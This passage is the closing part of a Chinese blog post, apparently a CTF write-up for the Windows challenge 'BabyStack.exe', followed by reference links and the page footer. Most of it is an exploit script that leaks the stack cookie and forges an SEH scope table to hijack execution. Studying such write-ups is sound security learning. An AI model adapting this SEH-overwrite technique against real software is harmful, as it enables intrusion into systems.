class="comment"># r.sendlineafter("&gt;","BabyStack.exe")</span></span><br><span class="line">ru(<span class="string">"stack address = "</span>)</span><br><span class="line">stack_addr = eval(rud(<span class="string">"\r\n"</span>))</span><br><span class="line">li(<span class="string">"stack_addr"</span>,stack_addr)</span><br><span class="line">ru(<span class="string">"main address = "</span>)</span><br><span class="line">main_addr = eval(rud(<span class="string">"\r\n"</span>))</span><br><span class="line">li(<span class="string">"main_addr"</span>,main_addr)</span><br><span class="line">except_addr = main_addr+<span class="number">2083</span></span><br><span class="line">ebp = stack_addr<span class="number">-32</span></span><br><span class="line">ru(<span class="string">"So,Can You Tell me what did you know?\r\n"</span>)</span><br><span class="line">sl((hex(except_addr)[<span class="number">2</span>:].upper()).rjust(<span class="number">8</span>,<span class="string">"0"</span>))</span><br><span class="line">shell_addr = main_addr+<span class="number">1357</span></span><br><span class="line"></span><br><span class="line">SEH_scope_table = p32(<span class="number">0xFFFFFFE4</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0xFFFFFF0c</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0xFFFFFFFE</span>)</span><br><span class="line">SEH_scope_table += p32(shell_addr)</span><br><span class="line"></span><br><span class="line">___security_cookie_addr = main_addr+<span class="number">0x5ea6</span></span><br><span class="line">ru(<span class="string">"Do you want to know more?\r\n"</span>)</span><br><span class="line">sl(<span class="string">"yes"</span>)</span><br><span class="line">ru(<span class="string">"Where do you want to know?\r\n"</span>)</span><br><span class="line">sl(str(___security_cookie_addr))</span><br><span class="line">ru(<span class="string">"value is "</span>)</span><br><span class="line"></span><br><span class="line">___security_cookie_value = eval(rud(<span class="string">"\r\n"</span>))</span><br><span class="line">li(<span class="string">"___security_cookie_value"</span>,___security_cookie_value)</span><br><span class="line">ru(<span class="string">"Do you want to know more?\r\n"</span>)</span><br><span class="line">sl(<span class="string">"yes"</span>)</span><br><span class="line">ru(<span class="string">"Where do you want to know?\r\n"</span>)</span><br><span class="line">Next_addr =  ebp<span class="number">-0x10</span></span><br><span class="line">sl(str(Next_addr))</span><br><span class="line">ru(<span class="string">"value is "</span>)</span><br><span class="line">Next_value = eval(rud(<span class="string">"\r\n"</span>))</span><br><span class="line">li(<span class="string">"Next_value"</span>,Next_value)</span><br><span class="line">ru(<span class="string">"Do you want to know more?\r\n"</span>)</span><br><span class="line">sl(<span class="string">"y"</span>)</span><br><span class="line">pay = <span class="string">"a"</span>*<span class="number">8</span>+SEH_scope_table.ljust(<span class="number">0x90</span><span class="number">-8</span>,<span class="string">"a"</span>)+p32(___security_cookie_value^(ebp))+<span class="string">"a"</span>*<span class="number">8</span>+p32(Next_value)+p32(main_addr + <span class="number">0x9f2</span>)+p32(((ebp<span class="number">-0xac</span>)+<span class="number">8</span>)^___security_cookie_value)+p32(<span class="number">0</span>)</span><br><span class="line">sl(pay)</span><br><span class="line">ru(<span class="string">"Do you want to know more?\r\n"</span>)</span><br><span class="line">sl(<span class="string">"yes"</span>)</span><br><span class="line">ru(<span class="string">"Where do you want to know?\r\n"</span>)</span><br><span class="line">sl(<span class="string">"0"</span>)</span><br><span class="line">ri()</span><br></pre></td></tr></table></figure></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>win pwn</code>其实和<code>linux pwn</code>差不多，不一样的只是利用手法。</p>
<p>本文如有不妥之处，敬请斧正。</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://bbs.pediy.com/thread-221016.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-221016.htm</a><br><a href="http://blog.eonew.cn/archives/1182" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1182</a><br><a href="https://blog.csdn.net/magictong/article/details/7517630" target="_blank" rel="noopener">https://blog.csdn.net/magictong/article/details/7517630</a></p>

        
        <br>
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>

        <div id="lv-container">
        </div>

    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        转发请备注<a href="“https://luobuming.github.io”">一筐萝卜</a>的个人博客 <br>
        本站总访问量<span id="busuanzi_value_site_pv"></span>次
       </p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "search.json"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="/js/index.js"></script>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




</html>
